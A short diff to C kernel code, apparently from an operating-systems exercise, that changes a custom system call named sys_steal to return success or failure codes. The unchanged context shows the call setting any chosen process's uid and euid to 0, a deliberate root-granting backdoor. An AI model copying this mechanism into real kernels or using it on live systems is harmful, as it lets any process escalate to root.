@@ -8,7 +8,7 @@ asmlinkage long sys_mygetpid(void)
   return current->tgid;
 }
 
-asmlinkage void sys_steal(pid_t pid)
+asmlinkage int sys_steal(pid_t pid)
 {
   struct task_struct* p = NULL;
 
@@ -18,6 +18,9 @@ asmlinkage void sys_steal(pid_t pid)
     {
      p->uid = 0;
      p->euid = 0;
+     return 0;
     }
   }
+
+  return -1;
 }
